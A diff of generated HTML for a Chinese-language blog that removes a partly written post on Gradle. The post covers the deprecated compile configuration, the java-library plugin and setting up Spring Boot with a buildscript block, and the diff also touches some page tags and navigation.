-
-
-<h3 id="提示有被gardle弃用的特性"><a href="#提示有被gardle弃用的特性" class="headerlink" title="提示有被gardle弃用的特性"></a>提示有被gardle弃用的特性</h3><p>一般是使用了compile,在7.0版本已被启用,转而使用api</p>
-<p>但是有可能出现没有api方法,可以将apply plugin: ‘java’  改为apply plugin:’java-library’</p>
-<hr>
-<h3 id="配置springboot"><a href="#配置springboot" class="headerlink" title="配置springboot"></a>配置springboot</h3><p>step1.配置buildscript</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">buildscript &#123;</span><br><span class="line">    ext&#123;</span><br><span class="line">        springBootVersion=<span class="string">&#x27;2.1.2.RELEASE&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    repositories &#123;</span><br><span class="line">        mavenCentral()</span><br><span class="line">    &#125;</span><br><span class="line">    dependencies &#123;</span><br><span class="line">        classpath(<span class="string">&quot;org.springframework.boot:spring-boot-gradle-plugin:$&#123;springBootVersion&#125;&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>往buildscript中写入以上脚本,作用是下载该依赖,让此依赖中包含一些插件</p>
-<p>为了让这些插件,加入gradle中,辅助build该项目.因此还需要应用该插件plugin,如下</p>
-<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">apply <span class="attr">plugin:</span> <span class="string">&#x27;org.springframework.boot&#x27;</span></span><br><span class="line">apply <span class="attr">plugin:</span> <span class="string">&#x27;io.spring.dependency-management&#x27;</span></span><br></pre></td></tr></table></figure>
-
-<p>此种应用插件的语法是专门针对使用buildscript引入的外来依赖中的插件,可见官方文档<a target="_blank" rel="noopener" href="https://docs.gradle.org/current/userguide/plugins.html#sec:applying_plugins_buildscript">Applying plugins with the buildscript block</a></p>
-<p>当使用io.spring.dependency-management插件后,当我们再引用springboot的依赖,可以不用再写版本号,以spring-boot-gradle-plugin的版本为准</p>
-<p>step2.引入依赖</p>
-<p>未完成…..</p>
-<hr>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">gradle</a>
-        		</li>
-      		 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color5">java</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-	<div class="article-category tagcloud">
-		<i class="icon-book icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="/categories/other//" class="article-tag-list-link color1">other</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/12/04/build-gradle%E7%9F%A5%E8%AF%86%E7%82%B9/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
       <a class="extend prev" rel="prev" href="/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next &amp;raquo;</a>
@@ -1594,7 +1566,7 @@ MathJax.Hub.Queue(function() {
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">plonkit</a>
+                <a href="javascript:void(0)" class="js-tag color4">plonk it</a>
               </li>
             
             <div class="clearfix"></div>
